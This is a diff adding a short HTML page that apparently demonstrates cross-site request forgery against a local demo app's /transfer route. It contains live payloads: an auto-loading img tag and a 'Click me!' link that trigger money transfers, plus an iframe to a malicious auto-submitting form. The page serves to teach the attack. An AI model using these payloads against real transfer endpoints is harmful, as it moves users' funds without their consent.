@@ -1,0 +1,13 @@
+
+<h2>Exploiting the GET route</h2>
+<p>The <code>GET /transfer</code> route is the most easily exploited. It's as simple as tricking the target user into opening a webpage with a malicious <code>&lt;img&gt;</code> tag:</p>
+<div><img src="http://localhost:3000/transfer?to=alice&amount=4"></div>
+<br>
+<p>Or by tricking the target user into clicking a malicious link:</p>
+<div><a href="http://localhost:3000/transfer?to=alice&amount=7">Click me!</a></div>
+
+<h2>Exploiting the POST route</h2>
+<p>The <code>POST /transfer</code> route is a little more difficult to exploit and requires using JavaScript to submit an HTML form:</p>
+<div>
+	<iframe src="/malicious-form"></iframe>
+</div>
